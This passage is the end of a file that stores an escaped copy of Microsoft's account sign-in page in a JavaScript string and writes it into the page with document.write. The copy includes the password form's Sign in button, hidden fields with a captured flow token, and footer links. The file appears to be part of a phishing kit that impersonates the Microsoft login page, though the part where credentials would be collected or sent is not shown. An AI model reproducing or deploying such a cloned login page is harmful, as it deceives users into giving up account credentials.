            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing&#34; class=&#34;button ext-button primary ext-primary&#34; value=&#34;Sign in&#34;>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
														<!-- ko if: tenantBranding.BoilerPlateText -->
														<!-- /ko -->
													</div>
													<!-- /ko -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- ko if: $parent.currentViewIndex() === $index() -->
													<!-- /ko -->
													<!-- /ko -->
												</div>
											</div>
										</div>
										<!-- /ko -->
									</div>
									<input type=&#34;hidden&#34; name=&#34;ps&#34; data-bind=&#34;value: postedLoginStateViewId&#34; value=&#34;&#34;>
									<input type=&#34;hidden&#34; name=&#34;psRNGCDefaultType&#34;
										data-bind=&#34;value: postedLoginStateViewRNGCDefaultType&#34; value=&#34;&#34;>
									<input type=&#34;hidden&#34; name=&#34;psRNGCEntropy&#34;
										data-bind=&#34;value: postedLoginStateViewRNGCEntropy&#34; value=&#34;&#34;>
									<input type=&#34;hidden&#34; name=&#34;psRNGCSLK&#34; data-bind=&#34;value: postedLoginStateViewRNGCSLK&#34;
										value=&#34;&#34;>
									<input type=&#34;hidden&#34; name=&#34;canary&#34; data-bind=&#34;value: svr.canary&#34; value=&#34;&#34;>
									<input type=&#34;hidden&#34; name=&#34;ctx&#34; data-bind=&#34;value: ctx&#34; value=&#34;&#34;>
									<input type=&#34;hidden&#34; name=&#34;hpgrequestid&#34; data-bind=&#34;value: svr.sessionId&#34; value=&#34;&#34;>
									<input type=&#34;hidden&#34; id=&#34;i0327&#34; data-bind=&#34;attr: { name: svr.B9 }, value: flowToken&#34;
										name=&#34;PPFT&#34;
										value=&#34;DRHWAfgnb5HCATUNajffU5f8ro0v*vn0i0fBgz8vAUeSO9cPP2aPnQjlC!9UuG98CfdFSRk2qh2Ye9kab7padwniHUY0Z1fb3RMX0W7uyuOrrdaxXZ8HtAenKu7z3yhsAqvPrwfjeezn8G0jCxDWdmYSA*LCCzstbT88Lo0!YTrKQtVJtNy4K8TfH4hy6Y1XGqDHmqUST7lXWwwdxM07Am4$&#34;>
									<input type=&#34;hidden&#34; name=&#34;PPSX&#34; data-bind=&#34;value: svr.cn&#34; value=&#34;Pa&#34;>
									<input type=&#34;hidden&#34; name=&#34;NewUser&#34; value=&#34;1&#34;>
									<input type=&#34;hidden&#34; name=&#34;FoundMSAs&#34; data-bind=&#34;value: svr.Ah&#34; value=&#34;&#34;>
									<input type=&#34;hidden&#34; name=&#34;fspost&#34; data-bind=&#34;value: svr.fPOST_ForceSignin ? 1 : 0&#34;
										value=&#34;0&#34;>
									<input type=&#34;hidden&#34; name=&#34;i21&#34; data-bind=&#34;value: wasLearnMoreShown() ? 1 : 0&#34;
										value=&#34;0&#34;>
									<input type=&#34;hidden&#34; name=&#34;CookieDisclosure&#34; data-bind=&#34;value: svr.BE ? 1 : 0&#34;
										value=&#34;0&#34;>
									<input type=&#34;hidden&#34; name=&#34;IsFidoSupported&#34;
										data-bind=&#34;value: isFidoSupported() ? 1 : 0&#34; value=&#34;1&#34;>
									<input type=&#34;hidden&#34; name=&#34;isSignupPost&#34; data-bind=&#34;value: isSignupPost() ? 1 : 0&#34;
										value=&#34;0&#34;>
									<div data-bind=&#34;component: { name: &#39;instrumentation-control&#39;,
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }&#34;>
										<input type=&#34;hidden&#34; name=&#34;i2&#34; data-bind=&#34;value: clientMode&#34; value=&#34;1&#34;>
										<input type=&#34;hidden&#34; name=&#34;i17&#34; data-bind=&#34;value: srsFailed&#34; value=&#34;0&#34;>
										<input type=&#34;hidden&#34; name=&#34;i18&#34; data-bind=&#34;value: srsSuccess&#34;>
										<input type=&#34;hidden&#34; name=&#34;i19&#34; data-bind=&#34;value: timeOnPage&#34; value=&#34;&#34;>
									</div>
									<!-- /ko -->
								</div>

								<div id=&#34;footer&#34; role=&#34;contentinfo&#34; data-bind=&#34;
                externalCss: {
                    &#39;footer&#39;: true,
                    &#39;has-background&#39;: !$page.useDefaultBackground(),
                    &#39;background-always-visible&#39;: $page.backgroundLogoUrl }&#34; class=&#34;footer ext-footer&#34;>
									<div data-bind=&#34;component: { name: &#39;footer-control&#39;,
                    publicMethods: $page.footerMethods,
                    params: {
                        serverData: svr,
                        useDefaultBackground: $page.useDefaultBackground(),
                        hasDarkBackground: $page.backgroundLogoUrl(),
                        showLinks: true },
                    event: {
                        agreementClick: $page.footer_agreementClick,
                        showDebugDetails: $page.toggleDebugDetails_onClick } }&#34;>
										<!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
										<div id=&#34;footerLinks&#34; class=&#34;footerNode text-secondary&#34;>
											<!-- ko if: showFooter -->
											<!-- ko if: !hideTOU --><a id=&#34;ftrTerms&#34; data-bind=&#34;
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }&#34;
												href=&#34;https://www.microsoft.com/en-US/servicesagreement/&#34;
												class=&#34;footer-content ext-footer-content footer-item ext-footer-item&#34;>Terms
												of use</a>
											<!-- /ko -->
											<!-- ko if: !hidePrivacy --><a id=&#34;ftrPrivacy&#34; data-bind=&#34;
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }&#34;
												href=&#34;https://privacy.microsoft.com/en-US/privacystatement&#34;
												class=&#34;footer-content ext-footer-content footer-item ext-footer-item&#34;>Privacy
												&amp; cookies</a>
											<!-- /ko -->
											<!-- ko if: impressumLink -->
											<!-- /ko -->
											<!-- ko if: showIcpLicense -->
											<!-- /ko -->
											<!-- /ko -->
											<!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --><a
												id=&#34;moreOptions&#34; href=&#34;#&#34; role=&#34;button&#34; data-bind=&#34;
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        attr: { &#39;aria-expanded&#39;: showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            &#39;footer-content&#39;: true,
            &#39;footer-item&#39;: true,
            &#39;debug-item&#39;: true,
            &#39;has-background&#39;: !useDefaultBackground,
            &#39;background-always-visible&#39;: hasDarkBackground }&#34; aria-label=&#34;Click here for troubleshooting information&#34;
												aria-expanded=&#34;false&#34;
												class=&#34;footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item&#34;>...</a>
										</div>
										<!-- /ko -->
										<!-- ko if: svr.fShowLegalMessagingInline && showLinks -->
										<!-- /ko -->
									</div>
								</div>
								<!-- /ko -->
							</div>
						</div>
					</div>
				</div>
				<!-- /ko -->
				<!-- ko if: isVerticalSplitTemplate() && isVerticalSplitTemplateLoaded() -->
				<!-- /ko -->
				<!-- /ko -->
				<!-- /ko -->
			</div>
			<!-- /ko -->
		</form>

		<script>


		</script>

</body>

</html>"

document.write(info)
</script>